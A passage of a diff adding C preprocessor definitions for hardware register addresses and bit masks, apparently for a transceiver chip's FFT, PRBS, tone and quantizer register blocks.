+#define ZR_QTDTB_CONFIG_LP0_WMASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP0_MASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP0_DEFAULT (0x0000)
+#define ZR_QTDTB_CONFIG_LP0_FMASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP1    FCI_GLBRX_REG(0x0248)
+#define ZR_QTDTB_CONFIG_LP1_WMASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP1_MASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP1_DEFAULT (0x0000)
+#define ZR_QTDTB_CONFIG_LP1_FMASK (0xCFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP2    FCI_GLBRX_REG(0x024C)
+#define ZR_QTDTB_CONFIG_LP2_WMASK (0xFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP2_MASK (0xFFF0FFF)
+#define ZR_QTDTB_CONFIG_LP2_DEFAULT (0x0000)
+#define ZR_QTDTB_CONFIG_LP2_FMASK (0xFFF0FFF)
+#define ZR_QTDTB_ADDR_LP01     FCI_GLBRX_REG(0x0250)
+#define ZR_QTDTB_ADDR_LP01_WMASK (0xFFF0FFF)
+#define ZR_QTDTB_ADDR_LP01_MASK (0xFFF0FFF)
+#define ZR_QTDTB_ADDR_LP01_DEFAULT (0x0000)
+#define ZR_QTDTB_ADDR_LP01_FMASK (0xFFF0FFF)
+#define ZR_QTDTB_ADDR_LP2      FCI_GLBRX_REG(0x0254)
+#define ZR_QTDTB_ADDR_LP2_WMASK (0x0FFF)
+#define ZR_QTDTB_ADDR_LP2_MASK (0x0FFF)
+#define ZR_QTDTB_ADDR_LP2_DEFAULT (0x0000)
+#define ZR_QTDTB_ADDR_LP2_FMASK (0x0FFF)
+#define ZR_DTB_OFFSET          FCI_GLBRX_REG(0x0258)
+#define ZR_DTB_OFFSET_WMASK    (0x0FFF)
+#define ZR_DTB_OFFSET_MASK     (0x0FFF)
+#define ZR_DTB_OFFSET_DEFAULT  (0x0000)
+#define ZR_DTB_OFFSET_FMASK    (0x0FFF)
+#define ZR_QTSCORE             FCI_GLBRX_REG(0x025C)
+#define ZR_QTSCORE_WMASK       (0x3FF00FF)
+#define ZR_QTSCORE_MASK        (0x3FF00FF)
+#define ZR_QTSCORE_DEFAULT     (0x0000)
+#define ZR_QTSCORE_FMASK       (0x3FF00FF)
+#define ZR_STAT_CTRL           FCI_GLBRX_REG(0x0260)
+#define ZR_STAT_CTRL_WMASK     (0x0101)
+#define ZR_STAT_CTRL_MASK      (0x0101)
+#define ZR_STAT_CTRL_DEFAULT   (0x0000)
+#define ZR_STAT_CTRL_FMASK     (0x0100)
+#define ZR_ALU_CLI_REQ_ALIAS0  FCI_GLBRX_REG(0x0264)
+#define ZR_ALU_CLI_REQ_ALIAS0_WMASK (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS0_MASK (0x1010101)
+#define ZR_ALU_CLI_REQ_ALIAS0_DEFAULT (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS0_FMASK (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS1  FCI_GLBRX_REG(0x0268)
+#define ZR_ALU_CLI_REQ_ALIAS1_WMASK (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS1_MASK (0x1010101)
+#define ZR_ALU_CLI_REQ_ALIAS1_DEFAULT (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS1_FMASK (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS2  FCI_GLBRX_REG(0x026C)
+#define ZR_ALU_CLI_REQ_ALIAS2_WMASK (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS2_MASK (0x0101)
+#define ZR_ALU_CLI_REQ_ALIAS2_DEFAULT (0x0000)
+#define ZR_ALU_CLI_REQ_ALIAS2_FMASK (0x0000)
+
+/* Ft Memory Address Constants */ 
+
+/* Ft Global Address Constants */ 
+#define ft_global_base         (0x20C800)
+#define FT_GLOBAL(r)           (int)(ft_global_base + (r))
+#define ft_global_size         (0x0200)
+
+#define FT_RX_CTRL             FT_GLOBAL(0x0000)
+#define FT_RX_CTRL_WMASK       (0x0003)
+#define FT_RX_CTRL_MASK        (0x0003)
+#define FT_RX_CTRL_DEFAULT     (0x0000)
+#define FT_RX_CTRL_FMASK       (0x0003)
+#define FT_RX_CTRL_A           FT_GLOBAL(0x0004)
+#define FT_RX_CTRL_A_WMASK     (0x0003)
+#define FT_RX_CTRL_A_MASK      (0x001F)
+#define FT_RX_CTRL_A_DEFAULT   (0x0000)
+#define FT_RX_CTRL_A_FMASK     (0x0003)
+#define FT_TX_CTRL             FT_GLOBAL(0x0008)
+#define FT_TX_CTRL_WMASK       (0x0003)
+#define FT_TX_CTRL_MASK        (0x003B)
+#define FT_TX_CTRL_DEFAULT     (0x0010)
+#define FT_TX_CTRL_FMASK       (0x0003)
+#define FT_TX_CTRL_A           FT_GLOBAL(0x000C)
+#define FT_TX_CTRL_A_WMASK     (0x0003)
+#define FT_TX_CTRL_A_MASK      (0x003B)
+#define FT_TX_CTRL_A_DEFAULT   (0x0010)
+#define FT_TX_CTRL_A_FMASK     (0x0003)
+#define FT_STATUS              FT_GLOBAL(0x0010)
+#define FT_STATUS_WMASK        (0x000A)
+#define FT_STATUS_MASK         (0x000F)
+#define FT_STATUS_DEFAULT      (0x0000)
+#define FT_STATUS_FMASK        (0x0005)
+#define FT_RX_SCALE            FT_GLOBAL(0x0014)
+#define FT_RX_SCALE_WMASK      (0x3FFF)
+#define FT_RX_SCALE_MASK       (0x3FFF)
+#define FT_RX_SCALE_DEFAULT    (0x0000)
+#define FT_RX_SCALE_FMASK      (0x3FFF)
+#define FT_TX_SCALE            FT_GLOBAL(0x0018)
+#define FT_TX_SCALE_WMASK      (0x3FFF)
+#define FT_TX_SCALE_MASK       (0x3FFF)
+#define FT_TX_SCALE_DEFAULT    (0x0000)
+#define FT_TX_SCALE_FMASK      (0x3FFF)
+
+/* Ftb Memory Address Constants */ 
+#define ftb_iffta_base         (0x210000)
+#define ftb_iffta_mask         (0xFFFFFFFF)
+#define ftb_iffta_size         (0x4000)
+#define ftb_iffta_default      (0x0000)
+#define ftb_ifftb_base         (0x214000)
+#define ftb_ifftb_mask         (0xFFFFFFFF)
+#define ftb_ifftb_size         (0x4000)
+#define ftb_ifftb_default      (0x0000)
+#define ftb_ifftc_base         (0x218000)
+#define ftb_ifftc_mask         (0xFFFFFFFF)
+#define ftb_ifftc_size         (0x4000)
+#define ftb_ifftc_default      (0x0000)
+#define ftb_ffta_base          (0x21C000)
+#define ftb_ffta_mask          (0xFFFFFFFF)
+#define ftb_ffta_size          (0x4000)
+#define ftb_ffta_default       (0x0000)
+#define ftb_fftb_base          (0x220000)
+#define ftb_fftb_mask          (0xFFFFFFFF)
+#define ftb_fftb_size          (0x4000)
+#define ftb_fftb_default       (0x0000)
+#define ftb_fftc_base          (0x224000)
+#define ftb_fftc_mask          (0xFFFFFFFF)
+#define ftb_fftc_size          (0x4000)
+#define ftb_fftc_default       (0x0000)
+
+/* Ftb Global Address Constants */ 
+#define ftb_global_base        (0x20D200)
+#define FTB_GLOBAL(r)          (int)(ftb_global_base + (r))
+#define ftb_global_size        (0x0200)
+
+#define FTB_CTRL               FTB_GLOBAL(0x0000)
+#define FTB_CTRL_WMASK         (0x38FFF)
+#define FTB_CTRL_MASK          (0x38FFF)
+#define FTB_CTRL_DEFAULT       (0x0000)
+#define FTB_CTRL_FMASK         (0x38FFF)
+#define FTB_IFFT_TSIZE         FTB_GLOBAL(0x0004)
+#define FTB_IFFT_TSIZE_WMASK   (0x7777)
+#define FTB_IFFT_TSIZE_MASK    (0x7777)
+#define FTB_IFFT_TSIZE_DEFAULT (0x2222)
+#define FTB_IFFT_TSIZE_FMASK   (0x7777)
+#define FTB_RX_STATUS          FTB_GLOBAL(0x0008)
+#define FTB_RX_STATUS_WMASK    (0x0000)
+#define FTB_RX_STATUS_MASK     (0x01FF)
+#define FTB_RX_STATUS_DEFAULT  (0x0080)
+#define FTB_RX_STATUS_FMASK    (0x0000)
+#define FTB_TX_STATUS          FTB_GLOBAL(0x000C)
+#define FTB_TX_STATUS_WMASK    (0x0000)
+#define FTB_TX_STATUS_MASK     (0x01FF)
+#define FTB_TX_STATUS_DEFAULT  (0x0081)
+#define FTB_TX_STATUS_FMASK    (0x0000)
+
+/* Ilv Memory Address Constants */ 
+#define ilv_dtb_base           (0x254000)
+#define ilv_dtb_mask           (0xFFFFFFFF)
+#define ilv_dtb_size           (0x2C00)
+#define ilv_dtb_default        (0x0000)
+#define ilv_dmetric_base       (0x257000)
+#define ilv_dmetric_mask       (0xFFFFFFFF)
+#define ilv_dmetric_size       (0x0800)
+#define ilv_dmetric_default    (0x0000)
+
+
+/* Qt Memory Address Constants */ 
+#define qt_abgtn_base          (0x230000)
+#define qt_abgtn_mask          (0xFFFFFFFF)
+#define qt_abgtn_size          (0x4400)
+#define qt_abgtn_default       (0x0000)
+#define qt_txaegt_base         (0x238000)
+#define qt_txaegt_mask         (0x70007)
+#define qt_txaegt_size         (0x2200)
+#define qt_txaegt_default      (0x0000)
+#define qt_rxfdqm_base         (0x23C000)
+#define qt_rxfdqm_mask         (0xFFFFFFFF)
+#define qt_rxfdqm_size         (0x4000)
+#define qt_rxfdqm_default      (0x0000)
+#define qt_rxfdqe_base         (0x240000)
+#define qt_rxfdqe_mask         (0x000F)
+#define qt_rxfdqe_size         (0x4000)
+#define qt_rxfdqe_default      (0x0000)
+#define qt_mco_ma_base         (0x24E000)
+#define qt_mco_ma_mask         (0xFFFFFFFF)
+#define qt_mco_ma_size         (0x0100)
+#define qt_mco_ma_default      (0x0000)
+#define qt_mco_ff_base         (0x24E100)
+#define qt_mco_ff_mask         (0xFFFFFFFF)
+#define qt_mco_ff_size         (0x0100)
+#define qt_mco_ff_default      (0x0000)
+#define qt_mco_ex_base         (0x24E200)
+#define qt_mco_ex_mask         (0x000F)
+#define qt_mco_ex_size         (0x0100)
+#define qt_mco_ex_default      (0x0000)
+#define qt_xyt_base            (0x24E800)
+#define qt_xyt_mask            (0xFFFFFFFF)
+#define qt_xyt_size            (0x0500)
+#define qt_xyt_default         (0x0000)
+#define qt_spm_base            (0x24F000)
+#define qt_spm_mask            (0x0000)
+#define qt_spm_size            (0x0180)
+#define qt_spm_default         (0x0000)
+#define qt_npsp_base           (0x24F200)
+#define qt_npsp_mask           (0x3FFFF)
+#define qt_npsp_size           (0x0180)
+#define qt_npsp_default        (0x0000)
+#define qt_vdt_base            (0x24F400)
+#define qt_vdt_mask            (0xFFFF)
+#define qt_vdt_size            (0x00C0)
+#define qt_vdt_default         (0x0000)
+#define qt_fdqasph_base        (0x24F500)
+#define qt_fdqasph_mask        (0x007F)
+#define qt_fdqasph_size        (0x0060)
+#define qt_fdqasph_default     (0x0000)
+#define qt_fdqaspl_base        (0x24F800)
+#define qt_fdqaspl_mask        (0xFFFFFFFF)
+#define qt_fdqaspl_size        (0x0300)
+#define qt_fdqaspl_default     (0x0000)
+#define qt_noiseaccl_base      (0x250000)
+#define qt_noiseaccl_mask      (0xFFFFFFFF)
+#define qt_noiseaccl_size      (0x1000)
+#define qt_noiseaccl_default   (0x0000)
+#define qt_noiseacch_base      (0x251000)
+#define qt_noiseacch_mask      (0xFFFF)
+#define qt_noiseacch_size      (0x1000)
+#define qt_noiseacch_default   (0x0000)
+#define qt_qtxpram_base        (0x252000)
+#define qt_qtxpram_mask        (0xFFFFFFFF)
+#define qt_qtxpram_size        (0x0100)
+#define qt_qtxpram_default     (0x0000)
+#define qt_qrxpram_base        (0x252400)
+#define qt_qrxpram_mask        (0xFFFFFFFF)
+#define qt_qrxpram_size        (0x0100)
+#define qt_qrxpram_default     (0x0000)
+#define qt_rxfbt_base          (0x252500)
+#define qt_rxfbt_mask          (0xFFFFFFFF)
+#define qt_rxfbt_size          (0x0100)
+#define qt_rxfbt_default       (0x0000)
+#define qt_rxfdt_base          (0x252600)
+#define qt_rxfdt_mask          (0xFF00FF00)
+#define qt_rxfdt_size          (0x0200)
+#define qt_rxfdt_default       (0x0000)
+
+/* Qt Global Address Constants */ 
+#define qt_global_base         (0x20CA00)
+#define QT_GLOBAL(r)           (int)(qt_global_base + (r))
+#define qt_global_size         (0x0100)
+
+#define IT_ENABLE              QT_GLOBAL(0x0000)
+#define IT_ENABLE_WMASK        (0x0001)
+#define IT_ENABLE_MASK         (0x0001)
+#define IT_ENABLE_DEFAULT      (0x0000)
+#define IT_ENABLE_FMASK        (0x0001)
+#define IR_ENABLE              QT_GLOBAL(0x0004)
+#define IR_ENABLE_WMASK        (0x0001)
+#define IR_ENABLE_MASK         (0x0001)
+#define IR_ENABLE_DEFAULT      (0x0000)
+#define IR_ENABLE_FMASK        (0x0001)
+#define IR_NSC                 QT_GLOBAL(0x0008)
+#define IR_NSC_WMASK           (0x0007)
+#define IR_NSC_MASK            (0x0007)
+#define IR_NSC_DEFAULT         (0x0000)
+#define IR_NSC_FMASK           (0x0007)
+#define IR_PRBS_CTRL           QT_GLOBAL(0x000C)
+#define IR_PRBS_CTRL_WMASK     (0x0003)
+#define IR_PRBS_CTRL_MASK      (0x0003)
+#define IR_PRBS_CTRL_DEFAULT   (0x0000)
+#define IR_PRBS_CTRL_FMASK     (0x0003)
+#define IR_PRBS0               QT_GLOBAL(0x0010)
+#define IR_PRBS0_WMASK         (0xFFFFFFFF)
+#define IR_PRBS0_MASK          (0xFFFFFFFF)
+#define IR_PRBS0_DEFAULT       (0x0000)
+#define IR_PRBS0_FMASK         (0xFFFFFFFF)
+#define IR_PRBS1               QT_GLOBAL(0x0014)
+#define IR_PRBS1_WMASK         (0xFFFFFFFF)
+#define IR_PRBS1_MASK          (0xFFFFFFFF)
+#define IR_PRBS1_DEFAULT       (0x0000)
+#define IR_PRBS1_FMASK         (0xFFFFFFFF)
+#define I_ABGT_OFFSET          QT_GLOBAL(0x0018)
+#define I_ABGT_OFFSET_WMASK    (0x1FFF1FFF)
+#define I_ABGT_OFFSET_MASK     (0x1FFF1FFF)
+#define I_ABGT_OFFSET_DEFAULT  (0x0000)
+#define I_ABGT_OFFSET_FMASK    (0x1FFF1FFF)
+
+/* Qt Qtxpram Address Constants */ 
+#define qt_qtxpram_reg_base    (0x252000)
+#define QT_QTXPRAM_REG(r)      (int)(qt_qtxpram_reg_base + (r))
+#define qt_qtxpram_reg_size    (0x0100)
+
+#define IT_CONFIG              QT_QTXPRAM_REG(0x0000)
+#define IT_CONFIG_WMASK        (0x0077)
+#define IT_CONFIG_MASK         (0x0077)
+#define IT_CONFIG_DEFAULT      (0x0000)
+#define IT_CONFIG_FMASK        (0x0077)
+#define IT_TCM_CTRL            QT_QTXPRAM_REG(0x0004)
+#define IT_TCM_CTRL_WMASK      (0x17FFFFF)
+#define IT_TCM_CTRL_MASK       (0x17FFFFF)
+#define IT_TCM_CTRL_DEFAULT    (0x0000)
+#define IT_TCM_CTRL_FMASK      (0x17FFFFF)
+#define IT_MISC                QT_QTXPRAM_REG(0x0008)
+#define IT_MISC_WMASK          (0xFFFFF0)
+#define IT_MISC_MASK           (0xFFFFF0)
+#define IT_MISC_DEFAULT        (0x0000)
+#define IT_MISC_FMASK          (0xFFFFF0)
+#define IT_ACT_ADDR            QT_QTXPRAM_REG(0x000C)
+#define IT_ACT_ADDR_WMASK      (0xFFF0FFF)
+#define IT_ACT_ADDR_MASK       (0xFFF0FFF)
+#define IT_ACT_ADDR_DEFAULT    (0x0000)
+#define IT_ACT_ADDR_FMASK      (0xFFF0FFF)
+#define IT_LP0_BITS            QT_QTXPRAM_REG(0x0010)
+#define IT_LP0_BITS_WMASK      (0xFFFF)
+#define IT_LP0_BITS_MASK       (0xFFFF)
+#define IT_LP0_BITS_DEFAULT    (0x0000)
+#define IT_LP0_BITS_FMASK      (0xFFFF)
+#define IT_LP1_BITS            QT_QTXPRAM_REG(0x0014)
+#define IT_LP1_BITS_WMASK      (0xFFFF)
+#define IT_LP1_BITS_MASK       (0xFFFF)
+#define IT_LP1_BITS_DEFAULT    (0x0000)
+#define IT_LP1_BITS_FMASK      (0xFFFF)
+#define IT_LP2_BITS            QT_QTXPRAM_REG(0x0018)
+#define IT_LP2_BITS_WMASK      (0xFFFF)
+#define IT_LP2_BITS_MASK       (0xFFFF)
+#define IT_LP2_BITS_DEFAULT    (0x0000)
+#define IT_LP2_BITS_FMASK      (0xFFFF)
+#define IT_DUMMY               QT_QTXPRAM_REG(0x001C)
+#define IT_DUMMY_WMASK         (0xFFFF)
+#define IT_DUMMY_MASK          (0xFFFF)
+#define IT_DUMMY_DEFAULT       (0x0000)
+#define IT_DUMMY_FMASK         (0xFFFF)
+#define IT_LP0_BIT_FIFO        QT_QTXPRAM_REG(0x0020)
+#define IT_LP0_BIT_FIFO_WMASK  (0x07FF)
+#define IT_LP0_BIT_FIFO_MASK   (0x07FF)
+#define IT_LP0_BIT_FIFO_DEFAULT (0x0000)
+#define IT_LP0_BIT_FIFO_FMASK  (0x07FF)
+#define IT_LP1_BIT_FIFO        QT_QTXPRAM_REG(0x0024)
+#define IT_LP1_BIT_FIFO_WMASK  (0x07FF)
+#define IT_LP1_BIT_FIFO_MASK   (0x07FF)
+#define IT_LP1_BIT_FIFO_DEFAULT (0x0000)
+#define IT_LP1_BIT_FIFO_FMASK  (0x07FF)
+#define IT_LP2_BIT_FIFO        QT_QTXPRAM_REG(0x0028)
+#define IT_LP2_BIT_FIFO_WMASK  (0x07FF)
+#define IT_LP2_BIT_FIFO_MASK   (0x07FF)
+#define IT_LP2_BIT_FIFO_DEFAULT (0x0000)
+#define IT_LP2_BIT_FIFO_FMASK  (0x07FF)
+#define IT_PILOT               QT_QTXPRAM_REG(0x002C)
+#define IT_PILOT_WMASK         (0xFFFFFFFF)
+#define IT_PILOT_MASK          (0xFFFFFFFF)
+#define IT_PILOT_DEFAULT       (0x0000)
+#define IT_PILOT_FMASK         (0xFFFFFFFF)
+#define IT_PTINDEX             QT_QTXPRAM_REG(0x0030)
+#define IT_PTINDEX_WMASK       (0x7FFF)
+#define IT_PTINDEX_MASK        (0x7FFF)
+#define IT_PTINDEX_DEFAULT     (0x0000)
+#define IT_PTINDEX_FMASK       (0x7FFF)
+#define IT_PRBS                QT_QTXPRAM_REG(0x0034)
+#define IT_PRBS_WMASK          (0xFFFFFFFF)
+#define IT_PRBS_MASK           (0xFFFFFFFF)
+#define IT_PRBS_DEFAULT        (0x0000)
+#define IT_PRBS_FMASK          (0xFFFFFFFF)
+#define IT_PRBS_MISC           QT_QTXPRAM_REG(0x0038)
+#define IT_PRBS_MISC_WMASK     (0xFFFFFFF8)
+#define IT_PRBS_MISC_MASK      (0xFFFFFFF8)
+#define IT_PRBS_MISC_DEFAULT   (0x0000)
+#define IT_PRBS_MISC_FMASK     (0xFFFFFFF8)
+#define IT_PRBS_POLY           QT_QTXPRAM_REG(0x003C)
+#define IT_PRBS_POLY_WMASK     (0xFFFFFFFF)
+#define IT_PRBS_POLY_MASK      (0xFFFFFFFF)
+#define IT_PRBS_POLY_DEFAULT   (0x0000)
+#define IT_PRBS_POLY_FMASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA0          QT_QTXPRAM_REG(0x0040)
+#define IT_PRBS_DATA0_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA0_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA0_DEFAULT  (0x0000)
+#define IT_PRBS_DATA0_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA1          QT_QTXPRAM_REG(0x0044)
+#define IT_PRBS_DATA1_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA1_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA1_DEFAULT  (0x0000)
+#define IT_PRBS_DATA1_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA2          QT_QTXPRAM_REG(0x0048)
+#define IT_PRBS_DATA2_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA2_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA2_DEFAULT  (0x0000)
+#define IT_PRBS_DATA2_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA3          QT_QTXPRAM_REG(0x004C)
+#define IT_PRBS_DATA3_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA3_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA3_DEFAULT  (0x0000)
+#define IT_PRBS_DATA3_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA4          QT_QTXPRAM_REG(0x0050)
+#define IT_PRBS_DATA4_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA4_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA4_DEFAULT  (0x0000)
+#define IT_PRBS_DATA4_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA5          QT_QTXPRAM_REG(0x0054)
+#define IT_PRBS_DATA5_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA5_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA5_DEFAULT  (0x0000)
+#define IT_PRBS_DATA5_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA6          QT_QTXPRAM_REG(0x0058)
+#define IT_PRBS_DATA6_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA6_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA6_DEFAULT  (0x0000)
+#define IT_PRBS_DATA6_FMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA7          QT_QTXPRAM_REG(0x005C)
+#define IT_PRBS_DATA7_WMASK    (0xFFFFFFFF)
+#define IT_PRBS_DATA7_MASK     (0xFFFFFFFF)
+#define IT_PRBS_DATA7_DEFAULT  (0x0000)
+#define IT_PRBS_DATA7_FMASK    (0xFFFFFFFF)
+#define IT_REF_GAIN            QT_QTXPRAM_REG(0x0060)
+#define IT_REF_GAIN_WMASK      (0x7FFF)
+#define IT_REF_GAIN_MASK       (0x7FFF)
+#define IT_REF_GAIN_DEFAULT    (0x0000)
+#define IT_REF_GAIN_FMASK      (0x7FFF)
+#define IT_NYQ_TONE_DATA       QT_QTXPRAM_REG(0x0064)
+#define IT_NYQ_TONE_DATA_WMASK (0xFFFFFFFF)
+#define IT_NYQ_TONE_DATA_MASK  (0xFFFFFFFF)
+#define IT_NYQ_TONE_DATA_DEFAULT (0x0000)
+#define IT_NYQ_TONE_DATA_FMASK (0xFFFFFFFF)
+#define IT_TXCG_0              QT_QTXPRAM_REG(0x0068)
+#define IT_TXCG_0_WMASK        (0x7FFFF)
+#define IT_TXCG_0_MASK         (0x7FFFF)
+#define IT_TXCG_0_DEFAULT      (0x0000)
+#define IT_TXCG_0_FMASK        (0x7FFFF)
+#define IT_TXCG_1              QT_QTXPRAM_REG(0x006C)
+#define IT_TXCG_1_WMASK        (0x7FFFF)
+#define IT_TXCG_1_MASK         (0x7FFFF)
+#define IT_TXCG_1_DEFAULT      (0x0000)
+#define IT_TXCG_1_FMASK        (0x7FFFF)
+#define IT_TXCG_2              QT_QTXPRAM_REG(0x0070)
+#define IT_TXCG_2_WMASK        (0x7FFFF)
+#define IT_TXCG_2_MASK         (0x7FFFF)
+#define IT_TXCG_2_DEFAULT      (0x0000)
+#define IT_TXCG_2_FMASK        (0x7FFFF)
+#define IT_TXCG_3              QT_QTXPRAM_REG(0x0074)
+#define IT_TXCG_3_WMASK        (0x7FFFF)
+#define IT_TXCG_3_MASK         (0x7FFFF)
+#define IT_TXCG_3_DEFAULT      (0x0000)
+#define IT_TXCG_3_FMASK        (0x7FFFF)
+#define IT_TXCG_4              QT_QTXPRAM_REG(0x0078)
+#define IT_TXCG_4_WMASK        (0x7FFFF)
+#define IT_TXCG_4_MASK         (0x7FFFF)
+#define IT_TXCG_4_DEFAULT      (0x0000)
+#define IT_TXCG_4_FMASK        (0x7FFFF)
+#define IT_TXCG_5              QT_QTXPRAM_REG(0x007C)
+#define IT_TXCG_5_WMASK        (0x7FFFF)
+#define IT_TXCG_5_MASK         (0x7FFFF)
+#define IT_TXCG_5_DEFAULT      (0x0000)
+#define IT_TXCG_5_FMASK        (0x7FFFF)
+#define IT_TXCG_6              QT_QTXPRAM_REG(0x0080)
+#define IT_TXCG_6_WMASK        (0x7FFFF)
+#define IT_TXCG_6_MASK         (0x7FFFF)
+#define IT_TXCG_6_DEFAULT      (0x0000)
+#define IT_TXCG_6_FMASK        (0x7FFFF)
+#define IT_TXCG_7              QT_QTXPRAM_REG(0x0084)
+#define IT_TXCG_7_WMASK        (0x7FFFF)
+#define IT_TXCG_7_MASK         (0x7FFFF)
+#define IT_TXCG_7_DEFAULT      (0x0000)
+#define IT_TXCG_7_FMASK        (0x7FFFF)
+#define IT_TXCG_8              QT_QTXPRAM_REG(0x0088)
+#define IT_TXCG_8_WMASK        (0x7FFFF)
+#define IT_TXCG_8_MASK         (0x7FFFF)
+#define IT_TXCG_8_DEFAULT      (0x0000)
+#define IT_TXCG_8_FMASK        (0x7FFFF)
+#define IT_TXCG_9              QT_QTXPRAM_REG(0x008C)
+#define IT_TXCG_9_WMASK        (0x7FFFF)
+#define IT_TXCG_9_MASK         (0x7FFFF)
+#define IT_TXCG_9_DEFAULT      (0x0000)
+#define IT_TXCG_9_FMASK        (0x7FFFF)
+#define IT_TXCG_10             QT_QTXPRAM_REG(0x0090)
+#define IT_TXCG_10_WMASK       (0x7FFFF)
+#define IT_TXCG_10_MASK        (0x7FFFF)
+#define IT_TXCG_10_DEFAULT     (0x0000)
+#define IT_TXCG_10_FMASK       (0x7FFFF)
+#define IT_TXCG_11             QT_QTXPRAM_REG(0x0094)
+#define IT_TXCG_11_WMASK       (0x7FFFF)
+#define IT_TXCG_11_MASK        (0x7FFFF)
+#define IT_TXCG_11_DEFAULT     (0x0000)
+#define IT_TXCG_11_FMASK       (0x7FFFF)
+#define IT_TXCG_12             QT_QTXPRAM_REG(0x0098)
+#define IT_TXCG_12_WMASK       (0x7FFFF)
+#define IT_TXCG_12_MASK        (0x7FFFF)
+#define IT_TXCG_12_DEFAULT     (0x0000)
+#define IT_TXCG_12_FMASK       (0x7FFFF)
+#define IT_TXCG_13             QT_QTXPRAM_REG(0x009C)
+#define IT_TXCG_13_WMASK       (0x7FFFF)
+#define IT_TXCG_13_MASK        (0x7FFFF)
+#define IT_TXCG_13_DEFAULT     (0x0000)
+#define IT_TXCG_13_FMASK       (0x7FFFF)
+#define IT_TXCG_14             QT_QTXPRAM_REG(0x00A0)
+#define IT_TXCG_14_WMASK       (0x7FFFF)
+#define IT_TXCG_14_MASK        (0x7FFFF)
+#define IT_TXCG_14_DEFAULT     (0x0000)
+#define IT_TXCG_14_FMASK       (0x7FFFF)
+#define IT_TXCG_15             QT_QTXPRAM_REG(0x00A4)
+#define IT_TXCG_15_WMASK       (0x7FFFF)
+#define IT_TXCG_15_MASK        (0x7FFFF)
+#define IT_TXCG_15_DEFAULT     (0x0000)
+#define IT_TXCG_15_FMASK       (0x7FFFF)
+#define IT_IFFTZ_RNG0          QT_QTXPRAM_REG(0x00A8)
+#define IT_IFFTZ_RNG0_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG0_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG0_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG0_FMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG1          QT_QTXPRAM_REG(0x00AC)
+#define IT_IFFTZ_RNG1_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG1_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG1_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG1_FMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG2          QT_QTXPRAM_REG(0x00B0)
+#define IT_IFFTZ_RNG2_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG2_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG2_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG2_FMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG3          QT_QTXPRAM_REG(0x00B4)
+#define IT_IFFTZ_RNG3_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG3_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG3_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG3_FMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG4          QT_QTXPRAM_REG(0x00B8)
+#define IT_IFFTZ_RNG4_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG4_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG4_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG4_FMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG5          QT_QTXPRAM_REG(0x00BC)
+#define IT_IFFTZ_RNG5_WMASK    (0x1FFFFFF)
+#define IT_IFFTZ_RNG5_MASK     (0x1FFFFFF)
+#define IT_IFFTZ_RNG5_DEFAULT  (0x0000)
+#define IT_IFFTZ_RNG5_FMASK    (0x1FFFFFF)
+#define IT_TONE0_DATA          QT_QTXPRAM_REG(0x00C0)
+#define IT_TONE0_DATA_WMASK    (0xFFFFFFFF)
+#define IT_TONE0_DATA_MASK     (0xFFFFFFFF)
+#define IT_TONE0_DATA_DEFAULT  (0x0000)
+#define IT_TONE0_DATA_FMASK    (0xFFFFFFFF)
+#define IT_DCI_CTRL            QT_QTXPRAM_REG(0x00C4)
+#define IT_DCI_CTRL_WMASK      (0x1FFFFFF)
+#define IT_DCI_CTRL_MASK       (0x1FFFFFF)
+#define IT_DCI_CTRL_DEFAULT    (0x0000)
